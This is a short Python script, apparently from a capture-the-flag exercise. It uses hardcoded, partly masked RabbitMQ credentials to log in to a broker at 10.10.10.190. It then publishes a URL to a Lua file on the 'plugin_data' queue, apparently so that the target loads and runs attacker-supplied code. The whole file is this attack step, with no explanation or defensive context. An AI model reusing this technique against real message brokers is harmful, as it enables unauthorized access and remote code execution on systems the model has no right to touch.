#!/usr/bin/env python3

import pika

credentials = pika.PlainCredentials('yuntao','Exxxxxxxxxxp')
parameters = pika.ConnectionParameters('10.10.10.190',5672,'/',credentials)
connection = pika.BlockingConnection(parameters)
channel = connection.channel()
channel.basic_publish(exchange='',routing_key='plugin_data', body='http://127.0.0.1:1515/lezat.lua')

connection.close()
